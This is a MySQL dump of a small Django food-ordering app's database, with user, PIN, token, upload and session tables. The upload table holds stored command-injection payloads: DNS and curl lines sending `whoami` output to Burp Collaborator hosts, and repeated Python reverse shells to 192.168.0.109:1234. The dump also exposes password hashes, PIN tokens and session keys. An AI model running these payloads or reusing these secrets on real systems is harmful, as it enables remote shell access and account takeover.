-- MySQL dump 10.13 Distrib 8.0.26, for Linux (x86_64) -- -- Host: localhost Database: food -- ------------------------------------------------------ -- Server version 8.0.26-0ubuntu0.20.04.2 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */; /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */; /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */; /*!50503 SET NAMES utf8mb4 */; /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */; /*!40103 SET TIME_ZONE='+00:00' */; /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */; /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */; /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */; /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */; -- -- Table structure for table `accounts_pin` -- DROP TABLE IF EXISTS `accounts_pin`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `accounts_pin` ( `id` bigint NOT NULL AUTO_INCREMENT, `pin` varchar(750) DEFAULT NULL, `pin_set` tinyint(1) NOT NULL, `user_id` varchar(150) NOT NULL, PRIMARY KEY (`id`), KEY `accounts_pin_user_id_1be63223_fk` (`user_id`), CONSTRAINT `accounts_pin_user_id_1be63223_fk` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`username`) ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `accounts_pin` -- LOCK TABLES `accounts_pin` WRITE; /*!40000 ALTER TABLE `accounts_pin` DISABLE KEYS */; INSERT INTO `accounts_pin` VALUES (2,'b\'6pe5VvUNvlRnl9+FRScl6f6CjCUDdzkUf38ogh8hyis=\'',1,'anof'),(3,'b\'ag5NyzfxIXUtv6tmVZJB8ldPd/yql1qUTxf3dLPruIQ=\'',1,'admin'); /*!40000 ALTER TABLE `accounts_pin` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `accounts_pintoken` -- DROP TABLE IF EXISTS `accounts_pintoken`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `accounts_pintoken` ( `id` bigint NOT NULL AUTO_INCREMENT, `pintoken` varchar(750) DEFAULT NULL, `user_id` varchar(150) NOT NULL, PRIMARY KEY (`id`), KEY `accounts_pintoken_user_id_ac7358a2_fk` (`user_id`), CONSTRAINT `accounts_pintoken_user_id_ac7358a2_fk` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`username`) ) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `accounts_pintoken` -- LOCK TABLES `accounts_pintoken` WRITE; /*!40000 ALTER TABLE `accounts_pintoken` DISABLE KEYS */; INSERT INTO `accounts_pintoken` VALUES (5,'1ivdK0SmCTW3b0ZPHDkKMRSWrK6FhQbG','anof'),(12,'RVnDSVqoJ2qKNFYADbaw8sA8s9xrx6ny','admin'); /*!40000 ALTER TABLE `accounts_pintoken` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `accounts_upload` -- DROP TABLE IF EXISTS `accounts_upload`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `accounts_upload` ( `id` bigint NOT NULL AUTO_INCREMENT, `file` varchar(100) DEFAULT NULL, `id1` varchar(750) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `accounts_upload` -- LOCK TABLES `accounts_upload` WRITE; /*!40000 ALTER TABLE `accounts_upload` DISABLE KEYS */; INSERT INTO `accounts_upload` VALUES (1,'burger_slide.png','rt||nslookup+`whoami`.fl46t60zqyg4xow74cds49svmmsdg2.burpcollaborator.net||'),(2,'burger_slide_qlrEZpd.png','nslookup+`whoami`.4chvkvrohn7todnwv14hvyjkdbj37s.burpcollaborator.net'),(3,'burger_slide_fIoq8Hi.png','curl `whoami`.4chvkvrohn7todnwv14hvyjkdbj37s.burpcollaborator.net'),(4,'burger_slide_wQeH7Za.png','export RHOST=\"192.168.0.109\";export RPORT=1234;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")\''),(5,'burger_slide_qujxL5h.png','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(6,'burger_slide_R7Y4n57.png','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(7,'about-img.jpg','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'),(8,'about-img_h5yy2HL.jpg','curl 192.168.0.109:1234'),(9,'about-img_eJyeY5N.jpg','curl `whoami`.prkgzg69w8me3y2hamj2ajy5swypme.burpcollaborator.net'),(10,'about-img_ibAZXFQ.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'),(11,'about-img_UMcVhhQ.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'),(12,'about-img_CPFIdyw.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(13,'about-img_GYJ6pZf.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\''); /*!40000 ALTER TABLE `accounts_upload` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_group` -- DROP TABLE IF EXISTS `auth_group`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_group` ( `id` int NOT NULL AUTO_INCREMENT, `name` varchar(150) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `name` (`name`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_group` -- LOCK TABLES `auth_group` WRITE; /*!40000 ALTER TABLE `auth_group` DISABLE KEYS */; /*!40000 ALTER TABLE `auth_group` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_group_permissions` -- DROP TABLE IF EXISTS `auth_group_permissions`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_group_permissions` ( `id` bigint NOT NULL AUTO_INCREMENT, `group_id` int NOT NULL, `permission_id` int NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`), KEY `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` (`permission_id`), CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`), CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_group_permissions` -- LOCK TABLES `auth_group_permissions` WRITE; /*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */; /*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_permission` -- DROP TABLE IF EXISTS `auth_permission`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_permission` ( `id` int NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL, `content_type_id` int NOT NULL, `codename` varchar(100) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`), CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_permission` -- LOCK TABLES `auth_permission` WRITE; /*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */; INSERT INTO `auth_permission` VALUES (1,'Can add log entry',1,'add_logentry'),(2,'Can change log entry',1,'change_logentry'),(3,'Can delete log entry',1,'delete_logentry'),(4,'Can view log entry',1,'view_logentry'),(5,'Can add permission',2,'add_permission'),(6,'Can change permission',2,'change_permission'),(7,'Can delete permission',2,'delete_permission'),(8,'Can view permission',2,'view_permission'),(9,'Can add group',3,'add_group'),(10,'Can change group',3,'change_group'),(11,'Can delete group',3,'delete_group'),(12,'Can view group',3,'view_group'),(13,'Can add user',4,'add_user'),(14,'Can change user',4,'change_user'),(15,'Can delete user',4,'delete_user'),(16,'Can view user',4,'view_user'),(17,'Can add content type',5,'add_contenttype'),(18,'Can change content type',5,'change_contenttype'),(19,'Can delete content type',5,'delete_contenttype'),(20,'Can view content type',5,'view_contenttype'),(21,'Can add session',6,'add_session'),(22,'Can change session',6,'change_session'),(23,'Can delete session',6,'delete_session'),(24,'Can view session',6,'view_session'),(25,'Can add pin',7,'add_pin'),(26,'Can change pin',7,'change_pin'),(27,'Can delete pin',7,'delete_pin'),(28,'Can view pin',7,'view_pin'),(29,'Can add pin token',8,'add_pintoken'),(30,'Can change pin token',8,'change_pintoken'),(31,'Can delete pin token',8,'delete_pintoken'),(32,'Can view pin token',8,'view_pintoken'),(33,'Can add upload',9,'add_upload'),(34,'Can change upload',9,'change_upload'),(35,'Can delete upload',9,'delete_upload'),(36,'Can view upload',9,'view_upload'); /*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_user` -- DROP TABLE IF EXISTS `auth_user`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_user` ( `id` int NOT NULL AUTO_INCREMENT, `password` varchar(128) NOT NULL, `last_login` datetime(6) DEFAULT NULL, `is_superuser` tinyint(1) NOT NULL, `username` varchar(150) NOT NULL, `first_name` varchar(150) NOT NULL, `last_name` varchar(150) NOT NULL, `email` varchar(254) NOT NULL, `is_staff` tinyint(1) NOT NULL, `is_active` tinyint(1) NOT NULL, `date_joined` datetime(6) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `username` (`username`) ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_user` -- LOCK TABLES `auth_user` WRITE; /*!40000 ALTER TABLE `auth_user` DISABLE KEYS */; INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=','2021-10-03 13:33:20.556170',1,'admin','','','admin@admin.com',1,1,'2021-10-02 14:06:18.062959'),(2,'VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0=','2021-10-02 14:25:55.934327',1,'anof','','','anof@admin.com',1,1,'2021-10-02 14:14:30.813498'); /*!40000 ALTER TABLE `auth_user` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_user_groups` -- DROP TABLE IF EXISTS `auth_user_groups`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_user_groups` ( `id` bigint NOT NULL AUTO_INCREMENT, `user_id` int NOT NULL, `group_id` int NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`), KEY `auth_user_groups_group_id_97559544_fk_auth_group_id` (`group_id`), CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`), CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_user_groups` -- LOCK TABLES `auth_user_groups` WRITE; /*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */; /*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `auth_user_user_permissions` -- DROP TABLE IF EXISTS `auth_user_user_permissions`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `auth_user_user_permissions` ( `id` bigint NOT NULL AUTO_INCREMENT, `user_id` int NOT NULL, `permission_id` int NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`), KEY `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` (`permission_id`), CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`), CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `auth_user_user_permissions` -- LOCK TABLES `auth_user_user_permissions` WRITE; /*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */; /*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `django_admin_log` -- DROP TABLE IF EXISTS `django_admin_log`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `django_admin_log` ( `id` int NOT NULL AUTO_INCREMENT, `action_time` datetime(6) NOT NULL, `object_id` longtext, `object_repr` varchar(200) NOT NULL, `action_flag` smallint unsigned NOT NULL, `change_message` longtext NOT NULL, `content_type_id` int DEFAULT NULL, `user_id` int NOT NULL, PRIMARY KEY (`id`), KEY `django_admin_log_content_type_id_c4bce8eb_fk_django_co` (`content_type_id`), KEY `django_admin_log_user_id_c564eba6_fk_auth_user_id` (`user_id`), CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`), CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`), CONSTRAINT `django_admin_log_chk_1` CHECK ((`action_flag` >= 0)) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `django_admin_log` -- LOCK TABLES `django_admin_log` WRITE; /*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */; /*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `django_content_type` -- DROP TABLE IF EXISTS `django_content_type`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `django_content_type` ( `id` int NOT NULL AUTO_INCREMENT, `app_label` varchar(100) NOT NULL, `model` varchar(100) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `django_content_type_app_label_model_76bd3d3b_uniq` (`app_label`,`model`) ) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `django_content_type` -- LOCK TABLES `django_content_type` WRITE; /*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */; INSERT INTO `django_content_type` VALUES (7,'accounts','pin'),(8,'accounts','pintoken'),(9,'accounts','upload'),(1,'admin','logentry'),(3,'auth','group'),(2,'auth','permission'),(4,'auth','user'),(5,'contenttypes','contenttype'),(6,'sessions','session'); /*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `django_migrations` -- DROP TABLE IF EXISTS `django_migrations`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `django_migrations` ( `id` bigint NOT NULL AUTO_INCREMENT, `app` varchar(255) NOT NULL, `name` varchar(255) NOT NULL, `applied` datetime(6) NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `django_migrations` -- LOCK TABLES `django_migrations` WRITE; /*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */; INSERT INTO `django_migrations` VALUES (1,'contenttypes','0001_initial','2021-10-02 13:57:22.996072'),(2,'auth','0001_initial','2021-10-02 13:57:23.177798'),(3,'accounts','0001_initial','2021-10-02 13:57:23.213792'),(4,'accounts','0002_pintoken','2021-10-02 13:57:23.239012'),(5,'accounts','0003_upload','2021-10-02 13:57:23.247147'),(6,'accounts','0004_upload_id1','2021-10-02 13:57:23.255255'),(7,'admin','0001_initial','2021-10-02 13:57:23.305569'),(8,'admin','0002_logentry_remove_auto_add','2021-10-02 13:57:23.312647'),(9,'admin','0003_logentry_add_action_flag_choices','2021-10-02 13:57:23.318566'),(10,'contenttypes','0002_remove_content_type_name','2021-10-02 13:57:23.354928'),(11,'auth','0002_alter_permission_name_max_length','2021-10-02 13:57:23.378038'),(12,'auth','0003_alter_user_email_max_length','2021-10-02 13:57:23.395005'),(13,'auth','0004_alter_user_username_opts','2021-10-02 13:57:23.403673'),(14,'auth','0005_alter_user_last_login_null','2021-10-02 13:57:23.426103'),(15,'auth','0006_require_contenttypes_0002','2021-10-02 13:57:23.428402'),(16,'auth','0007_alter_validators_add_error_messages','2021-10-02 13:57:23.435125'),(17,'auth','0008_alter_user_username_max_length','2021-10-02 13:57:23.526848'),(18,'auth','0009_alter_user_last_name_max_length','2021-10-02 13:57:23.554626'),(19,'auth','0010_alter_group_name_max_length','2021-10-02 13:57:23.567549'),(20,'auth','0011_update_proxy_permissions','2021-10-02 13:57:23.574274'),(21,'auth','0012_alter_user_first_name_max_length','2021-10-02 13:57:23.599703'),(22,'sessions','0001_initial','2021-10-02 13:57:23.611884'); /*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */; UNLOCK TABLES; -- -- Table structure for table `django_session` -- DROP TABLE IF EXISTS `django_session`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `django_session` ( `session_key` varchar(40) NOT NULL, `session_data` longtext NOT NULL, `expire_date` datetime(6) NOT NULL, PRIMARY KEY (`session_key`), KEY `django_session_expire_date_a5c62663` (`expire_date`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `django_session` -- LOCK TABLES `django_session` WRITE; /*!40000 ALTER TABLE `django_session` DISABLE KEYS */; INSERT INTO `django_session` VALUES ('0h40eymby4c2711xgdnzytlbb4l1tvh0','.eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mX1cG:1rsDJloMG92YvqwV5mTSb_7pqLWLJQXm1JbQRGWHwhY','2021-10-17 13:33:20.558410'),('jozmv8z1yy0lw0wfspiflxa6yd9m632l','.eJxVjDsOwjAQBe_iGln-BS-U9JzBWnt3cQA5UpxUiLtDpBTQvpl5L5VwXWpaO89pJHVWTh1-t4zlwW0DdMd2m3SZ2jKPWW-K3mnX14n4edndv4OKvX5rKA7AR0RLhgQgeCBjPVtGAMmSjZeIA8ToAguYQDaa4STogo-Fj-r9Ad_xN7E:1mWfxb:pxt69Z1N_UAAWUO6wtH_LW7-4TRAjt9qaPO3MFYGOGw','2021-10-16 14:25:55.937601'),('yfeyhxt4bm17g2i9j4hy54py3clzh7yj','.eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mWyuE:PUd-sMqktTogLEuri6wFhU0xr65WvMQpKng-wvGBMPQ','2021-10-17 10:39:42.664410'); /*!40000 ALTER TABLE `django_session` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; /*!40101 SET SQL_MODE=@OLD_SQL_MODE */; /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */; /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */; /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */; /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */; /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */; /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */; -- Dump completed on 2022-07-22 8:24:50 